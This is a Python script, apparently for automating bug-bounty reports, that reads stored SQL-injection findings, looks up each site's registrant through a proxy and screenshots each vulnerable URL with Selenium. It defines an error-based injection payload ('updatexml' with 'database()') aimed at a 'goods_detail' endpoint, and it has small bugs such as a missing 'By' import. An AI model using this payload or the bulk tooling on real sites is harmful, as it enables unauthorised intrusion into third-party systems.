# coding:utf-8
import pandas as pd
import time
import requests
from lxml import etree
from selenium import webdriver
proxy={
    'http':'tps157.kdlapi.com:15818'
}
payload='/index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,database(),0x7e),1)'
headers={
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36 SLBrowser/7.0.0.5211 SLBChan/23',
    'Refer':'http://icp.chinaz.com/mootek.cn'
}
def name_seek(url):
    urls='http://icp.chinaz.com/'+url
    print(urls)
    try:
        result=requests.get(urls,headers=headers,proxies=proxy,timeout=10).content
        soup =etree.HTML(result)
        ip_data = soup.xpath('//li[@class="clearfix"]/p/text()')
        ip_data1 = ip_data[0]
        print(ip_data1)
        return ip_data1
    except Exception as f:
        url_er=url.split('.')
        url_e=url_er[1]
        return url_e

def Vul_bak():
    print("信息")
    list = []
    with open("D:\\桌面\\学习\\安全\\SRC\\自动提交脚本\\sql_ip_vuln2.txt","r",encoding="gbk") as fp:#读取漏洞信息，需要修改路径
        for i in fp:
            list.append(i.strip("\n"))
        '''
        for t in range(0,6,6):
            Vul_title = list[t]
            Vul_name = list[t+1]
            Vul_host = list[t+2]
            Vul_detail = list[t+3]
            Vul_url = list[t+4]
            Vul_image = list[t+5]
        '''
        return list


if __name__ == '__main__':
    global domain
    list_data = Vul_bak()
    for i in range(0,9523,6):#提交数量，每6个一组漏洞
        print(i)
        Vul_host = list_data[i+2]
        Vul_url = list_data[i+4]
        domain=name_seek(Vul_host)
        if 'https' in Vul_host:
            driver = webdriver.Chrome()
            driver.maximize_window()
            try:
                driver.get(Vul_url)
                time.sleep(2)
                driver.find_element(By.XPATH,'/html/body/div/div[2]/button[3]').click()
                driver.find_element(By.XPATH,'/html/body/div/div[3]/p[2]/a').click()
                time.sleep(1)
                driver.save_screenshot('.\\images2\\'+domain+'.png')
                driver.quit()
            except Exception as e:
                time.sleep(1)
                driver.save_screenshot('.\\images2\\'+domain+'.png')
                driver.quit()
        else:
            driver = webdriver.Chrome()
            driver.maximize_window()
            try:
                driver.get(Vul_url)
                time.sleep(1)
                driver.save_screenshot('.\\images2\\'+domain+'.png')
                driver.quit()
            except Exception as e:
                pass